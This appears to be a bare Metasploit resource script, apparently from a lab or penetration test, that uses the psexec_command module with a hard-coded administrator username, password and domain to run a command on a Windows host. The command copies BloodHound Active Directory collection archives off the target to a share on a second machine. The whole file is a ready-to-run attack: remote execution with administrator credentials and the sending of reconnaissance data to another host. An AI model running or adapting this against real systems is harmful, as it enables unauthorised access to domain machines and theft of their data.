use auxiliary/admin/smb/psexec_command
set SMBUser administrador
set SMBPass "Vuln3r4bl3..."
set SMBDomain VULNDOMAIN
set SMBSHARE C$
set RHOSTS 192.168.156.137
set command "xcopy C:\\BloodhoundClient\\*.zip \\\192.168.156.135\\Bloodhound"
run
